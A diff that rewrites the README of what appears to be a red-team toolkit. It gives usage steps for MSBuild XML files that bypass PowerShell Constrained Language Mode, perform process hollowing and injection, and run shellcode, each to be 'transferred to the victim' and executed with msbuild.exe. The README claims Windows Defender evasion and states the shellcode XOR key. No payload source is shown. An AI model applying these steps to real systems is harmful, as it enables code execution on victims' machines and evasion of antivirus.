@@ -1,18 +1,22 @@
-### CLM Bypass
-- The source file `clm-bypass.xml` can be used to bypass CLM and obtain FullLanguage mode within the same session, transfer to victim and run: 
-- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe clm-bypass.xml`
+## Constrained Language Mode (CLM) Bypass
 
-### Process Hollowing (can run 32bit shellcode aswell! with Framework64.)
-- The file `hollow.xml` can be used to perform process hollowing, very stable and bypass defender, transfer to victim and run:
-- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe hollow.xml`
-- *NOTE: shellcode is XOR'd with key: 0xfa*
+- The `clm-bypass.xml` source file enables bypassing Constrained Language Mode (CLM) to achieve FullLanguage mode within the same session. To utilize, transfer the file to the target system and execute:
+  - `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe clm-bypass.xml`
 
-### Process Injection (can run 32bit shellcode aswell! with Framework64.)
-- The file `processInjection.xml` can be used to perform process injection, very stable and bypass defender, transfer to victim and run:
-- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe inject.xml`
-- *NOTE: shellcode is XOR'd with key: 0xfa*
+## Process Hollowing
 
-### Shellcode Runner
-- The file `shellcodeRunner.xml` used to inject and execute shellcode to the current process, transfer to victim and run:
-- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe shellcodeRunner.xml`
-- *NOTE: shellcode is XOR'd with key: 0xfa*
+- The `hollow.xml` file facilitates process hollowing, offering a stable method capable of executing both 32-bit and 64-bit shellcode while evading Windows Defender detection. To deploy, transfer the file to the target system and execute:
+  - `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe hollow.xml`
+  - **Note**: The shellcode is XOR-encrypted with the key `0xfa`.
+
+## Process Injection
+
+- The `processInjection.xml` file supports process injection, providing a reliable mechanism for executing both 32-bit and 64-bit shellcode while bypassing Windows Defender. To implement, transfer the file to the target system and execute:
+  - `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe inject.xml`
+  - **Note**: The shellcode is XOR-encrypted with the key `0xfa`.
+
+## Shellcode Execution
+
+- The `shellcodeRunner.xml` file is designed to inject and execute shellcode within the current process. To use, transfer the file to the target system and execute:
+  - `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe shellcodeRunner.xml`
+  - **Note**: The shellcode is XOR-encrypted with the key `0xfa`.
